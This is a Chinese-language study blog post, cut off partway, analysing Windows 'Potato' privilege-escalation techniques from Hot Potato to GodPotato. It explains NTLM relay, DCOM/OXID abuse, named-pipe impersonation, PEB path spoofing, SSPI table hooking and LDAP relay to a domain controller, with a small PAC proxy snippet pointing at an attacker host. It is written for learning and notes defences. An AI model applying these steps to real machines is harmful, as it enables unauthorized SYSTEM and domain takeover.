<h1>土豆提权</h1>
<p>本文对土豆家族中几个关键提权漏洞进行学习分析，注意是学习提权思路，poc具体细节以后有时间再分析。</p>
<h2>Hot Potato</h2>
<p>Hot Potato 即热土豆，是最初的土豆提权，在 2016 年由 <a href="https://x.com/breenmachine">@breenmachine</a> 披露，大致流程是：</p>
<ol>
<li>NBNS 欺骗</li>
<li>构造本地 HTTP，响应 WPAD</li>
<li>HTTP -&gt; SMB NTLM Relay</li>
<li>等待高权限进程的访问，即激活更新服务(低权限可激活)</li>
</ol>
<h3>利用过程</h3>
<h4>NBNS 欺骗</h4>
<p>NBNS 是 windows 下的命名查询服务，当 DNS 解析失败时，windows 就会尝试 NBNS 解析主机名，所以当 windows 找不到 WPAD 主机时，就会利用该服务进行解析，我们此时就可以构造虚假的数据包进行欺骗，从而进行中继攻击。</p>
<blockquote>
<p>注意：</p>
<ol>
<li>这里为了保证 dns 解析失败，使用了 UDP 端口耗尽技术，即攻击者可以伪造大量 DNS 响应包 ，并使用所有可能的源端口号进行响应，就会导致系统无法再分配新的端口用于 DNS 查询，从而我们的目标机器只能走 NBNS</li>
<li>攻击者为了对 NBNS 查询进行响应，还必须匹配数据包中 TXID 字段，不过该字段只有两字节，直接暴力发送即可</li>
</ol>
</blockquote>
<h4>构造本地 HTTP，响应 WPAD</h4>
<p>成功劫持 WPAD 之后，会向目标机器会返回一个自定义的 PAC 文件地址，（通常是 https(http)://attacker_ip/wpad.dat），该 PAC 文件中指定浏览器将所有流量代理到攻击者的机器上。文件的示例如下：</p>
<pre><code class="language-javascript">function FindProxyForURL(url, host) {
    return &quot;PROXY attacker_ip:80&quot;;
}
</code></pre>
<h4>HTTP -&gt; SMB NTLM Relay</h4>
<p>当用户访问某些受保护资源（如本地共享目录）时，系统会自动发起 NTLM 认证。流量经过攻击者的代理服务器，攻击者可以截获这个认证过程，然后再将认证流量转发，成功后可以获得当前用户的高权限模拟令牌,本质就是个 ntlm relay 攻击</p>
<h4>等待高权限进程的访问</h4>
<p>Windows 更新服务（wuauserv）是以 SYSTEM 权限运行的，如果某个低权限用户能触发该服务进行网络访问（例如检查更新），它就会使用 SYSTEM 身份去访问网络资源，如果此时设置了代理为攻击者的机器，SYSTEM 用户就会向攻击者的 HTTP 服务发起 NTLM 认证请求 。</p>
<blockquote>
<p>注意：此漏洞利用并不稳定，有时需要等待 Windows 更新和 WPAD 缓存刷新几个小时。</p>
</blockquote>
<p>利用流程图如下所示：</p>
<p><img src="https://raw.githubusercontent.com/fdx-xdf/md_images/master/siyuan_img/image-20250602103425-ibs2cb3.png" alt="image" /></p>
<h3>防御</h3>
<p>目前微软已打补丁，在 MS16-075（烂土豆） 上修补跨协议中继，针对 CVE-2016-3213 的 WPAD 解析也已修复，并且在请求 PAC 文件时不再发送凭据 (CVE-2016-3236)。</p>
<h2>Rotten Potato</h2>
<p>Rotten Potato 即烂土豆，同样在 2016 年由 <a href="https://x.com/breenmachine">@breenmachine</a> 披露，它的优点是立即触发，而不需要进行等待。</p>
<h3>前置知识</h3>
<ol>
<li>
<p>NTLM 是一种基于挑战-响应的身份验证协议，握手流程如下：</p>
<table>
<thead>
<tr>
<th>步骤</th>
<th>数据包类型</th>
<th>发送方</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>NTLM_NEGOTIATE</td>
<td>客户端</td>
</tr>
<tr>
<td>2</td>
<td>NTLM_CHALLENGE</td>
<td>服务端</td>
</tr>
<tr>
<td>3</td>
<td>NTLM_AUTHENTICATE</td>
<td>客户端</td>
</tr>
</tbody>
</table>
<p>在 Rotten Potato 攻击中，攻击者会劫持整个握手过程，并模拟服务端完成这个流程。</p>
</li>
<li>
<p>Windows 提供了一个安全接口 API：<code>AcceptSecurityContext</code>​，用于处理 NTLM 的服务端部分。</p>
<p>攻击者可以利用这个函数来：</p>
<ul>
<li>接收客户端发送的 <code>NTLM_NEGOTIATE</code>​</li>
<li>返回 <code>NTLM_CHALLENGE</code>​</li>
<li>接收并验证 <code>NTLM_AUTHENTICATE</code>​</li>
<li>最终获得一个 <strong>impersonation token（模拟令牌）</strong></li>
</ul>
</li>
<li>
<p>需要理解的几个知识：</p>
<ol>
<li>使用 DCOM 时，如果以服务的方式远程连接，那么权限为 System，例如 BITS 服务</li>
<li>使用 DCOM 可以通过 TCP 连接到本机的一个端口，发起 NTLM 认证，该认证可以被重放</li>
<li>LocalService 用户默认具有 SeImpersonate 和 SeAssignPrimaryToken 权限</li>
<li>开启 SeImpersonate 权限后，能够在调用 CreateProcessWithToken 时，传入新的 Token 创建新的进程</li>
<li>开启 SeAssignPrimaryToken 权限后，能够在调用 CreateProcessAsUser 时，传入新的 Token 创建新的进程</li>
</ol>
</li>
</ol>
<p>其大致原理如下所示：</p>
<ol>
<li>通过 NT AUTHORITY/SYSTEM 运行的 RPC 将尝试通过 <code>CoGetInstanceFromIStorage</code>​ API 调用向我们的本地代理进行身份验证</li>
<li>端口 135 是 DCOM RPC 的监听端口，攻击者利用它来获取“标准”的 NTLM_CHALLENGE 数据包结构,我们使用该 <code>NTLM_CHALLENGE</code> ​回复 DCOM，但注意其中 <code>CHALLENGE</code> ​值已被替换。</li>
<li>AcceptSecurityContextAPI 调用以在本地模拟 NT AUTHORITY/SYSTEM</li>
</ol>
<p>下面详细分析其流程。</p>
<h3>利用过程</h3>
<h4>CoGetInstanceFromIStorage</h4>
<p>​<code>CoGetInstanceFromIStorage</code>​，它是 COM 系统用来创建“远程对象”的标准方法，支持指定远程 IP 地址。在 RottenPotato 里，它用于“诱导 SYSTEM 服务去连接你伪造的接口”，核心就是诱导激活。</p>
<blockquote>
<ol>
<li>它请求 DCOM 激活服务（SYSTEM） 帮你<a href="https://so.csdn.net/so/search?q=%E5%88%9D%E5%A7%8B%E5%8C%96&amp;spm=1001.2101.3001.7020">初始化</a> CLSID；</li>
<li>系统服务以 SYSTEM 身份连接你指定的 DCOM 管道（或 RPC 接口）；</li>
</ol>
</blockquote>
<p>我们调用 <code>CoGetInstanceFromIStorage</code>​ 这个 api 远程激活某个 COM 对象，在利用中，通过指定恶意代理地址（可以是本地自己启动的 RPC 代理服务）来劫持这个认证过程。在原作者的 demo 中使用的 COM 对象为 BITS，CLSID 为 <code>{4991d34b-80a1-4291-83b6-3328366b9097}</code>​。</p>
<h4>DCOM 向代理发送 NTLM 协商包</h4>
<p>当 SYSTEM 身份的进程尝试连接到远程服务时，会发起 NTLM_NEGOTIATE ，而 NTLM_NEGOTIATE 是 NTLM 握手的第一步。</p>
<h4>代理转发</h4>
<p>在接收到这个 <code>NTLM_NEGOTIATE</code>​ 后，攻击者的代理服务器会调用 <code>AcceptSecurityContext()</code>​ 函数，并将接收到的 <code>NTLM_NEGOTIATE</code> ​作为输入参数传递给它，<code>AcceptSecurityContext()</code>​ 会处理这个协商包，并通常会生成一个 <code>NTLM_CHALLENGE </code>​ 的 CHALLENGE 值。同时，攻击者的代理服务器会将 <code>NTLM_NEGOTIATE</code>​ 发送给本地的 135 端口，得到另一个 <code>NTLM_CHALLENGE</code>​ 数据包，将该数据包里的 CHALLENGE 值替换成 <code>AcceptSecurityContext()</code>​ 中获取的，再发送给最初的 DCOM，并且得到一个合法的 <code>NTLM_AUTHENTICATE</code>​ 数据包，然后再调用 <code>AcceptSecurityContext</code>​ 来处理这个数据包，如果成功则会返回成功状态，之后使用 <code>ImpersonateSecurityContext</code>​ 这个 api 就会获取模拟令牌。</p>
<p>利用流程图如下所示：</p>
<p><img src="https://raw.githubusercontent.com/fdx-xdf/md_images/master/siyuan_img/image-20250602133120-zii8us1.png" alt="image" /></p>
<p>再偷一个 project zero 的图（图里面的有关术语在 Rogue Potato 时进行说明）：</p>
<p><img src="https://raw.githubusercontent.com/fdx-xdf/md_images/master/siyuan_img/image-20250604161534-o0dlbkd.png" alt="image" /></p>
<h3>防御</h3>
<p>不再有效，由于 DCOM 和 OXID 解析器上的补丁，<strong>Windows 10 1809</strong> 和 <strong>Windows Server 2019</strong> 之后无法正常工作。</p>
<p>更加详细的分析可以参考：<a href="https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/">Rotten Potato – 从服务账户到 SYSTEM 的权限提升 (foxglovesecurity.com)</a>。</p>
<h2>Juicy Potato</h2>
<p>该提权是在上面的烂土豆基础上改进而来的，其基本原理是差不多的。</p>
<h3>介绍</h3>
<ul>
<li>CLSID 是标识 COM 类对象的全局唯一标识符。它是一个类似 UUID 的标识符。</li>
<li>程序员和系统管理员使用后台智能传输服务 (BITS)从 HTTP Web 服务器和 SMB 文件共享下载文件或将文件上传到 HTTP Web 服务器和 SMB 文件共享。关键是 BITS 实现了 IMarshal 接口并允许代理声明强制 NTLM 身份验证。</li>
</ul>
<p>Rotten Potato 的 PoC 使用带有默认 CLSID 的 BITS</p>
<pre><code class="language-c#">// Use a known local system service COM server, in this cast BITSv1
Guid clsid = new Guid(&quot;4991d34b-80a1-4291-83b6-3328366b9097&quot;);
</code></pre>
<p>但是现在发现除了 BITS 之外，还有几个进程外 COM 服务器由可能被滥用的特定 CLSID 标识。他们至少需要：</p>
<ul>
<li>可由当前用户实例化，通常是具有模拟权限的服务用户</li>
<li>实现 IMarshal 接口</li>
<li>以提升的用户身份运行（SYSTEM、Administrator，...）</li>
</ul>
<p>具体可以参考这里：<a href="https://ohpe.it/juicy-potato/CLSID/">https://ohpe.it/juicy-potato/CLSID/</a>。</p>
<p>此外，Juicy Potato 还对创建进程方式进行了优化，如果 LocalService 开启 SeImpersonate 权限，则调用 CreateProcessWithToken 创建 system 权限进程；如果 LocalService 开启 SeAssignPrimaryToken 权限，调用 CreateProcessAsUser 创建 system 权限进程。</p>
<p>除此之外和利用方式和烂土豆是一样的，不再赘述。</p>
<h3>防御</h3>
<p>不再有效，同 Rotten Potato。微软修复了与 OXID 解析器相关的提权漏洞，使得攻击者无法再通过指定自定义端口（如 1337）伪造本地 RPC 服务。现在 OXID Resolver 只能使用固定的端口 135，且尝试通过远程 OXID 解析器将请求转发到本地伪造服务时，只会以 ANONYMOUS LOGON 身份运行，无法获得高权限令牌。</p>
<h2>Rogue Potato</h2>
<p>RoguePotato 是在早期的 RottenPotato 和 JuicyPotato 方法基础上发展起来的，特别针对 JuicyPotato 无法工作的环境，例如 WindowsServer2019 和 WindowsBuild1809 之后的版本，微软对 DCOM 解析器进行了安全更新，强制OXID解析的端口是135并且还是匿名登录，限制了 DCOM 服务与本地 RPC 进行通信，这是为了阻止像 RottenPotato 或 JuicyPotato 这样的攻击，为了绕过这个限制，RoguePotato 使用其他远程主机的 135 端口做转发，通过远程主机将数据传到本地伪造的 RPC 服务上。</p>
<h3>前置知识</h3>
<ol>
<li>
<p>RPCSS：RPCSS 服务是 COM 和 DCOM 服务器的服务控制管理器。它执行 COM 和 DCOM 服务器的对象激活请求、对象导出程序解析和分布式垃圾回收。</p>
<p><img src="https://raw.githubusercontent.com/fdx-xdf/md_images/master/siyuan_img/image-20250604112018-yyr7r4m.png" alt="image" /></p>
</li>
<li>
<p>OXID（对象导出器标识符）是一个用于标识网络上 DCOM 对象的唯一数字。</p>
<p>当一个客户端应用程序想要访问一个远程 COM 对象时，它需要使用 OXID 查询来获取对象所在服务器的信息（绑定信息），随即 RPC 服务会调用 <code>ResolveOxid2</code> ​函数来解析 OXID 的查询请求，并返回绑定信息</p>
</li>
<li>
<p>从 OBJREF 结构中连接到原始对象是一个分为两个步骤的过程：</p>
<ol>
<li>客户端从结构中提取 对象导出器 ID（OXID） ，并根据 OBJREF 中指定的 RPC 绑定信息 ，联系对应的 OXID 解析服务（OXID Resolver） 。</li>
<li>客户端使用 OXID 解析服务来查找承载该对象的 COM 服务器 的 RPC 绑定信息 ，然后与该 COM 服务器的 RPC 端点建立连接，以访问对象的接口。</li>
</ol>
</li>
</ol>
<h3>利用过程</h3>
<p>在先前的 Rotten/Juicy Potato 攻击中，通过 CoGetInstanceFromIStorage，通过构造引用对象使指定 CLSID 的 COM 组件连接恶意服务端进行认证，这里访问的服务端就是 OXID resolver，其会解析需要加载的 Instance bind 在什么地方，在这个访问环节中存在 NTLM 认证，Rotten potato 就是在和 OXID resolver 交互的过程中进行 NTLM 中继，但是由于微软的修复，不能指定 135 以外的端口 + 访问远程使用匿名登录，烂土豆失效。rogue potato 的想法就是不在查询环节进行利用，而是通过更改查询的结果，通过实现 ResolveOxid2 方法对解析结果进行控制，将 COM 组件再次重定向回本地的恶意服务。</p>
<h4>触发 COM 服务连接远程机器 135 端口</h4>
<p>同样的，RoguePotato 首先选择一个 CLSID(类标识符)来发起一个 DCOM 对象的激活请求，这个请求的目的是让系统创建或激活一个指定的 COM 对象。在 <code>IStorage</code> ​对象中，指定了远程 OXID 解析器的字符串绑定，这个绑定将指向我们远程的恶意 oxid 解析器的 IP 地址。当使用 <code>CoGetInstanceFromIStorage</code> ​函数对 <code>IStorage</code> ​对象进行 UnMarshall（解封）时, 会触发 DCOM 激活服务（RPCSS 中的一部分）向 oxid 解析器发送一个 oxid 解析请求, 以此定位对象的绑定信息，由于微软限制了不能指定 135 以外的端口，我们这里指定了远程机器的 135 端口。</p>
<h4>伪造 ResolveOxid2</h4>
<p>在远程机器的 135 端口上设置一个端口转发，将所有流量转发到部署的恶意 OXID 解析服务上。然后编写恶意的 ResolveOxid2 函数的代码以此返回一个被篡改后的响应，此响应包含的绑定信息为: <code>ncacn_np:localhost/pipe/roguepotato[\pipe\epmapper]</code>​</p>
<p>在此绑定信息中, RoguePotato 特意使系统使用 <code>RPC over SMB</code>​(ncacn_np), 而不是默认的 <code>RPC over TCP</code>​(ncacn_ip_tcp)，这是因为 SMB 协议允许通过命名管道进行通信，而命名管道可以用于接下来的权限模拟操作，而原作者实践过程中发现 ncacn_ip_tcp 返回的是识别令牌，无法利用。</p>
<h4>身份模拟</h4>
<p>RoguePotato 在目标系统上创建了一个特殊的命名管道，其完整名称为 <code>\\.\pipe\roguepotato\pipe\epmapper</code>​，以此来等待 RPCSS 的连接，当 RPCSS 连接后，则调用 <code>ImpersionateNamedPipeClient</code> ​函数模拟 RPCSS 服务的安全上下文，这样就能以相同的权限执行代码。</p>
<h4>令牌窃取与进程创建</h4>
<p>当攻击者的线程成功使用 <code>RpcImpersonateClient</code>​ 模拟 rpcss 服务身份后，通过枚举系统的所有进程句柄来找到 rpcss 服务的句柄，然后筛选出进程中拥有 SYSTEM 权限的令牌，最终使用 <code>CreateProcessAsUser</code>​ 或 <code>CreateProcessWithToken</code>​ 函数来创建高权限的进程</p>
<h4>关于 NETWORK_SERVICE to SYSTEM</h4>
<p>作者在原文中写到：</p>
<blockquote>
<p>if you can trick the “Network Service” account to write to a named pipe over the “network” and are able to impersonate the pipe, you can access the tokens stored in RPCSS service</p>
<p>翻译：如果您可以欺骗 “Network Service” 帐户通过 “network” 写入命名管道并能够模拟该管道，则可以访问 RPCSS 服务中存储的令牌</p>
</blockquote>
<p>关于为什么让 rpcss 连接到自己的恶意命名管道就能提权，可以参考文章：<a href="https://decoder.cloud/2020/05/04/from-network-service-to-system/">从 NETWORK SERVICE 到 SYSTEM – Decoder 的博客</a> 以及 <a href="https://www.tiraniddo.dev/2020/04/sharing-logon-session-little-too-much.html">Tyranid's Lair：共享登录会话有点太多 (tiraniddo.dev)</a>，这里简单说一下：</p>
<ul>
<li>
<p><strong>登录会话共享</strong>：Windows 的登录会话机制允许同一会话中的不同进程共享某些权限和令牌（Token）。当 LSASS（Local Security Authority Subsystem Service）为一个登录会话创建第一个令牌时，该令牌会被存储并用于后续的网络认证。这意味着，NETWORK SERVICE 账户的进程可能共享同一个登录会话的令牌。</p>
</li>
<li>
<p><strong>本地回环认证</strong>：当使用 SMB（Server Message Block）协议通过本地回环（如 \localhost\pipe...）访问命名管道时，系统会在内核模式下执行网络认证。由于内核模式具有 TCB（Trusted Computing Base）特权，认证过程会使用登录会话中存储的第一个令牌，而这个令牌可能属于高权限进程（如 RPCSS 的 SYSTEM 令牌）。</p>
</li>
<li>
<p>RPCSS（Remote Procedure Call Subsystem）是 Windows 的核心服务，运行在 SYSTEM 权限下，且通常是 NETWORK SERVICE 登录会话中的第一个进程。因此，LSASS 存储的该会话的令牌是 RPCSS 的 SYSTEM 令牌。所以在本地回环认证中，系统会使用登录会话的第一个令牌（即 SYSTEM 令牌）来完成认证，而不是调用者的实际令牌（NETWORK SERVICE 令牌）。这是漏洞的核心所在。</p>
</li>
<li>
<p>通过构造恶意命名管道，攻击者可以诱导 RPCSS 连接到该管道，触发本地回环认证，进而获取 SYSTEM 权限的令牌。</p>
</li>
</ul>
<p>利用流程图：</p>
<p><img src="https://raw.githubusercontent.com/fdx-xdf/md_images/master/siyuan_img/image-20250605112643-ybtqwaf.png" alt="image" /></p>
<p>再偷一个 project zero 的图：</p>
<p><img src="https://raw.githubusercontent.com/fdx-xdf/md_images/master/siyuan_img/image-20250605112718-iekadse.png" alt="image" /></p>
<h3>防御</h3>
<p>现在仍然有效。</p>
<p>参考文章：<a href="https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/">没有 JuicyPotato？老故事，欢迎 RoguePotato！– 解码器的博客 (decoder.cloud)</a></p>
<h2>PrintSpoofer (or PipePotato or BadPotato)</h2>
<p>这个漏洞有三个名字，最初公开 POC 的老外叫它 PrintSpoofer，之后 360 的 paper 叫它 PipePotato，然后 Beichen 师傅的 POC 又叫它 BadPotato，后文统一称为 PrintSpoofer。</p>
<h3>利用</h3>
<p>从前面的漏洞分析中我们可以明确，为了在另一个用户的上下文中创建进程，我们需要一个令牌，模拟令牌的等级需要为 <code>SecurityImpersonation</code>​，不同的模拟令牌区别可见下表。然后，通过一个利用命名管道模拟的服务器应用程序，我们可以获得该令牌。所以我们现在只需要找到一个 system 权限的进程去连接该命名管道就行。</p>
<table>
<thead>
<tr>
<th>​<code>SecurityAnonymous</code>​</th>
<th>0</th>
<th>客户端身份不可见，完全匿名</th>
</tr>
</thead>
<tbody>
<tr>
<td>​<strong>​<code>SecurityIdentification</code>​</strong>​</td>
<td><strong>1</strong></td>
<td><strong>可识别客户端身份，但不能模拟其执行操作</strong></td>
</tr>
<tr>
<td><strong>​<code>SecurityImpersonation</code>​</strong>​</td>
<td><strong>2</strong></td>
<td><strong>可以在本机上模拟客户端身份执行操作</strong></td>
</tr>
<tr>
<td>​<strong>​<code>SecurityDelegation</code>​</strong>​</td>
<td><strong>3</strong></td>
<td><strong>可以在远程机器上模拟客户端身份（需要 Kerberos 和约束委派）</strong></td>
</tr>
</tbody>
</table>
<p>‍</p>
<p>​<code>spoolsv.exe</code> ​服务有一个公开的 RPC 服务，里面有这个函数 <code>RpcRemoteFindFirstPrinterChangeNotificationEx</code>​，此函数会创建一个远程更改通知对象，用于监视打印机对象的更改，并使用 <code>RpcRouterReplyPrinter </code> ​或 <code>RpcRouterReplyPrinterEx </code> ​将更改通知发送到打印客户端，该函数声明如下，其中 <code>pszLocalMachine</code> ​参数需要传递 UNC 路径，传递 <code>\\127.0.0.1</code> ​时，服务器会访问 <code>\\127.0.0.1\pipe\spoolss</code>​。</p>
<pre><code class="language-c">DWORD RpcRemoteFindFirstPrinterChangeNotificationEx( 
    /* [in] */ PRINTER_HANDLE hPrinter,
    /* [in] */ DWORD fdwFlags,
    /* [in] */ DWORD fdwOptions,
    /* [unique][string][in] */ wchar_t *pszLocalMachine,
    /* [in] */ DWORD dwPrinterLocal,
    /* [unique][in] */ RPC_V2_NOTIFY_OPTIONS *pOptions)

</code></pre>
<p>‍</p>
<p>但是 <code>\\127.0.0.1\pipe\spoolss</code> ​这个命名管道已经被 <code>NT AUTHORITY\SYSTEM</code> ​创建，并且我们希望只在本地进行利用，所以这里就利用了一个小 trick，我们 <code>\\127.0.0.1/pipe/foo</code> ​时，校验路径时会认为 <code>127.0.0.1/pipe/foo</code> ​是主机名，随后在连接 named pipe 时会对参数做标准化，将 <code>/</code> ​转化为 <code>\</code>​，于是就会连接 <code>\\127.0.0.1\pipe\foo\pipe\spoolss</code>​，攻击者就可以注册这个 named pipe 从而窃取 client 的 token，从而进行模拟。</p>
<h3>防御</h3>
<p>itm4n 在 blog 中提到，在使用 <code>CreateFile</code> ​打开命名管道时，可以添加 <code>SECURITY_IDENTIFICATION </code> ​flag 使得模仿时得到的 token 是 identification token，即 <code>SecurityIdentification</code>​，此时获取的 token 就不能用于模拟。</p>
<p>但现在仍没有官方补丁。</p>
<p>参考文章：<a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/">PrintSpoofer - Abusing Impersonation Privileges on Windows 10 and Server 2019 | itm4n's blog</a></p>
<h2>PrintNotifyPotato/JuicyPotatoNG</h2>
<p>这两个名字也是一个东西，只不过一个是 <a href="https://github.com/BeichenDream/PrintNotifyPotato">BeichenDream</a> 师傅的 C#实现，一个是 <a href="https://github.com/antonioCoco/JuicyPotatoNG">antonioCoco</a> 的 C++ 实现。</p>
<p>在 JuicyPotato 发布后，Microsoft 通过将获取的令牌更改为 Indentification 令牌，对可滥用的 CLSID 进行了重要修改。此外，需要属于 INTERACTIVE 组才能利用其他 CLSID（例如 PrintNotify），这并不常见。</p>
<p>在 <a href="https://decoder.cloud/2020/05/30/the-impersonation-game/">The impersonation game</a> 中解释了为什么 RPC 调用中得到的 token 是 <code>identification token</code>​，确实是发起 RPC 调用时设定好的，并通过寻找注册表，发现了一个名为 <code>PrintNotify</code> ​的服务，其注册表中的 <code>Impersonation level</code> ​为 <code>impersonation</code>​，使用该 CLSID 对 fake OXID resolver 进行查询，重定向到本地 evil RPC server 后，在第一次 RPC 远程调用得到 anonymous logon 后，由查询 <code>IremUnknown2</code> ​触发的回调成功拿到了 SYSTEM，然而这个组件需要用户在 <code>INTERACTIVE</code> ​组中才能完全利用。<br />
后续在 <a href="https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/">Giving JuicyPotato a second chance: JuicyPotatoNG</a> 中给出了更完整的利用，使用 <code>LogonUser</code> ​函数进行登录，由于使用的是 <code>LogonNewCredentials</code>​，LSASS 会直接给这个 token 加一个 <code>INTERACTIVE</code>​，由于这个 token 只适用于远程网络认证，所以随便填一个用户名密码均可成功。</p>
<h3>本地利用</h3>
<p>上面说的利用方式无法再本地进行利用，针对本地利用，James Forshaw 专门写了一篇文章进行说明：<a href="https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html">Project Zero: Windows Exploitation Tricks: Relaying DCOM Authentication</a>。</p>
<p>本次攻击的最终目标是实现一种不依赖特权用户登录的本地权限提升。其核心思路是，通过一系列技术手段，在本地捕获计算机自身域账户的认证凭据，并将其成功中继到域控制器（DC）的LDAP服务，进而获取域内的高级权限。接下来对攻击流程以及几个关键点进行说明。</p>
<h4><strong>强制本地COM使用TCP协议通信</strong></h4>
<p>我们在之前的 RoguePotato 利用中，指定 OXID 查询为远程 135 端口，然后进行转发到本地恶意 OXID 解析服务进行利用，现在我们要完全在本地进行利用，所以不能走这一套了。所以我们的 OBJREF 变成了 Objref Moniker，它是一个特殊的字符串格式，像这样 objref:TUVP...，它不再是“间接”的 OBJREF，而是“直接”的 COM 对象引用，它会告诉系统我不需要走 OXID Resolver 那一套流程，我已经知道你要连接谁了。</p>
<h4><strong>过RPCSS服务的防火墙安全检查</strong></h4>
<ul>
<li>
<p><strong>问题</strong>：当客户端尝试通过TCP连接COM服务端时，RPCSS服务会作为前置检查者。它会调用内部函数<code>IsPortOpen</code>​，获取发起请求的COM服务器进程的完整可执行文件路径（<code>ImageFileName</code>​），并检查该路径是否在Windows防火墙策略中被允许监听端口。对于一个未知的攻击程序，此检查必然失败，RPCSS会拒绝返回TCP绑定信息，导致客户端连接错误。</p>
</li>
<li>
<p><strong>解决方案</strong>：伪造进程环境块（PEB）中的进程路径。</p>
<ol>
<li>通过测试发现，<code>C:\Windows\System32\svchost.exe</code>​ 是一个默认被防火墙策略信任的路径。</li>
<li>攻击者在自己的程序代码中，于初始化COM组件之前，调用API修改当前进程PEB内的<code>ImagePathName</code>​字段，将其值更改为<code>C:\Windows\System32\svchost.exe</code>​。</li>
<li>随后程序初始化COM并向RPCSS注册。RPCSS在注册时获取到的就是这个伪造的、受信任的路径。</li>
<li>当<code>IsPortOpen</code>​检查发生时，它检查的是这个伪造路径，因此检查通过，RPCSS正常返回TCP绑定信息。</li>
</ol>
</li>
</ul>
<h4><strong>捕获客户端认证凭据</strong></h4>
<ul>
<li>
<p><strong>问题</strong>：TCP连接通路已建立，需要在服务端捕获客户端发送过来的认证数据。直接挂钩（Hook）相关API函数比较困难，且风险较高。</p>
</li>
<li>
<p><strong>解决方案</strong>：<strong>修改内存中可写的安全函数表</strong>。</p>
<ol>
<li>RPC运行时通过调用<code>InitSecurityInterface</code>​函数来从安全库（如<code>sspicli.dll</code>​）中获取一个函数表，该表包含了一系列用于处理认证的函数指针。</li>
<li>经分析，该函数表所在的内存区域是<strong>可写的</strong>。</li>
<li>攻击者在程序中提前调用<code>InitSecurityInterface</code>​获取到该表的地址，然后直接修改表中的函数指针，使其指向攻击者自己实现的代码。当认证发生时，系统就会调用被替换后的函数，从而截获凭据。</li>
</ol>
</li>
</ul>
<h4><strong>本地中继的失败与攻击目标的转移</strong></h4>
<ul>
<li><strong>问题</strong>：攻击者最初尝试将截获的凭据中继回本机上的其他高权限服务，以实现本地提权。但该尝试失败了。</li>
<li><strong>失败原因</strong>：微软引入了专门的防御措施。RPC运行时的<code>SSECURITY_CONTEXT::ValidateUpgradeCriteria</code>​函数会检测认证请求是否同时满足两个条件：1. 来自<strong>本机环回（Loopback）地址；2. 认证级别低于数据包完整性（<strong>​</strong>​<code>RPC_C_AUTHN_LEVEL_PKT_INTEGRITY</code>​</strong>​ <strong>）</strong> 。如果都满足，该连接将被视为不安全并被拒绝。</li>
<li><strong>策略变更</strong>：既然本地中继的路被阻塞，攻击策略转向网络中继。</li>
<li><strong>新目标</strong>：选择<strong>域控制器的LDAP服务</strong>。选择它的原因是，LDAP服务的默认配置<strong>不强制要求客户端进行LDAP签名</strong>。这对于中继攻击至关重要，因为攻击者只有认证凭据，没有建立通信所需的会话密钥，因此无法生成签名。</li>
</ul>
<h4><strong>修改系统LDAP库的行为</strong></h4>
<ul>
<li>
<p><strong>问题</strong>：为了与LDAP服务通信，攻击者决定使用系统自带的<code>wldap32.dll</code>​库。但该库在默认情况下会尝试启用LDAP签名，这会导致中继攻击失败。控制这一行为的注册表键<code>LdapClientIntegrity</code>​需要管理员权限才能修改。</p>
</li>
<li>
<p><strong>解决方案</strong>：<strong>使用</strong>​<strong>​<code>RegOverridePredefKey</code>​</strong>​ <strong>API临时重定向注册表查询</strong>。</p>
<ol>
<li>攻击者调用<code>RegOverridePredefKey</code>​，将所有对<code>HKEY_LOCAL_MACHINE</code>​注册表根键的查询，临时重定向到攻击者在<code>HKEY_CURRENT_USER</code>​下创建的一个可控键上。</li>
<li>在那个可控键下，攻击者仿造路径并设置<code>LdapClientIntegrity</code>​的值为<code>0</code>​（禁用签名）。</li>
<li>加载<code>wldap32.dll</code>​。该DLL在初始化时读取配置，由于重定向，它会读到攻击者设置的禁用签名的值。</li>
<li>DLL加载完成后，立即取消注册表重定向，恢复系统正常状态，整个过程对其他程序无影响。</li>
</ol>
</li>
</ul>
<h4><strong>选择用于触发认证的COM服务</strong></h4>
<ul>
<li>
<p><strong>问题</strong>：需要找到一个合适的系统服务来发起最初的认证，这个服务必须满足多个苛刻的条件。</p>
</li>
<li>
<p><strong>筛选条件</strong>：</p>
<ol>
<li>必须以<code>SYSTEM</code>​或<code>NETWORK SERVICE</code>​身份运行，这样其网络认证才会使用计算机账户。</li>
<li>其COM认证级别必须是<code>RPC_C_AUTHN_LEVEL_PKT_CONNECT</code>​，以确保不启用完整性保护。</li>
<li>不能是托管在<code>svchost.exe</code>​中的服务，因为<code>svchost.exe</code>​会统一提升其托管服务的安全级别。</li>
</ol>
</li>
<li>
<p><strong>选定的触发器</strong>：<code>CRemoteAppLifetimeManager</code>​ COM服务。该服务完全符合上述所有条件。</p>
</li>
</ul>
<p>完整的攻击流程：</p>
<ul>
<li>攻击者在目标机器上运行其综合性攻击程序。</li>
<li>程序设置好安全函数表劫持和LDAP库改造的陷阱。</li>
<li>程序创建一个恶意的COM对象引用（OBJREF），并诱使第4步中找到的<code>CRemoteAppLifetimeManager</code>​服务来解析它。</li>
<li>​<code>CRemoteAppLifetimeManager</code>​服务（以<code>NETWORK SERVICE</code>​身份）在解析时，向攻击者的陷阱发起了认证。由于是网络认证，它使用的是计算机账户的凭据。</li>
<li>陷阱通过被劫持的安全函数表，成功捕获到计算机账户的Kerberos凭据。</li>
<li>攻击程序立即将此凭据中继给被改造过的<code>wldap32.dll</code>​库。</li>
<li>​<code>wldap32.dll</code>​带着这个高权限凭据，向域控制器的LDAP服务发起连接（由于改造，连接不要求签名）。</li>
<li>连接成功，攻击者现在能以计算机账户的身份对域控LDAP执行任意操作，例如将自己的账户加入域管理员组，从而完全控制整个域。</li>
</ul>
<h3>防御</h3>
<p>目前仍然有效</p>
<h2>GodPotato</h2>
<p>Beichen师傅的作品，一个通过 DCOM 提权的方式。利用了 Windows rpcss 服务对 OXID 处理的漏洞进行提权操作。</p>
<h3>利用</h3>
<h4><strong>初始化与RPC接口定位</strong></h4>
<p>攻击的准备阶段，目标是为后续的函数挂钩定位必要的信息。</p>
<ol>
<li><strong>定位RPC接口结构</strong>: 程序首先会加载并分析核心COM组件库 <code>combase.dll</code>​。它会在该模块内搜索一个特定的接口GUID (<code>18f70770-8e64-11cf-9af1-0020af6e72f4</code>​)，以准确定位到DCOM通信所依赖的 <code>RPC_SERVER_INTERFACE</code>​ 结构体。这个结构体包含了RPC调度的关键信息。</li>
